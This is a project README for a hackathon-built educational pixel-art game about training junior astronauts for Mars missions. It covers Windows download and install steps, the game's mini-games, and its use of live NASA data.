# 🚀 Mars-terclass

**Mars-terclass** is a 2D pixel-art, story-driven mini-game collection that trains junior astronauts for Mars missions. It was developed by **Pinar Collage** for the **NASA Space Apps Challenge Ankara 2026**, for the challenge **"Build a Junior Astronaut Mission Trainer"**.

There is no character to control: players learn through short space stories and interactive mini-games, and every mission teaches a real scientific fact.

## ▶ Download & Play (Windows)

The game is large, so it is packaged as a single ZIP file in this repository.

**➡️ [Download Mars-terclass.zip](https://github.com/klombi11/Mars-terclass/raw/main/Mars-terclass.zip)**

1. **Download** `Mars-terclass.zip` using the link above.
   (Alternative: open `Mars-terclass.zip` in the file list above and click **Download raw file**.)
2. **Extract the whole ZIP** to a folder: right-click the file → **Extract All...** → **Extract**.
   Do not run the game directly from inside the ZIP.
3. Open the extracted folder and double-click the **`.exe` file** to start the game.
   Keep all files in the folder together; the game needs them to run.
4. If Windows shows a *"Windows protected your PC"* warning, click **More info → Run anyway**.
   This happens because the game is not signed by a publisher. It is safe to run.
5. An **internet connection** is recommended: the game fetches live NASA data while you play.

> **Troubleshooting:** If the game does not start, make sure the ZIP was fully extracted, then try again. Antivirus software may scan the file the first time.

## 🎮 About the Project

Mars-terclass turns space-mission training into a story-driven game:

1. **Story:** each mission opens with a short space story.
2. **Mini-game:** players solve it by making decisions and playing.
3. **Learning:** each mission teaches a real scientific fact.

**Current mini-games**

| Mini-game | What it teaches |
|---|---|
| Solar Storm Shelter | Solar storm risks and protection |
| Meteor Radar | Tracking meteoroid threats by radar |
| Crater Lakes | Ancient lake beds on Mars |
| Connection to the World | Mars–Earth communication delay |

## 🛰️ Real & Live NASA Data

The game uses **real NASA data** and fetches it **live** through NASA Open APIs (including Mars weather data). The data is requested from within the game using GDScript, and it changes the conditions and difficulty of the mini-games.

*This project is not endorsed by NASA. No NASA logo is used.*
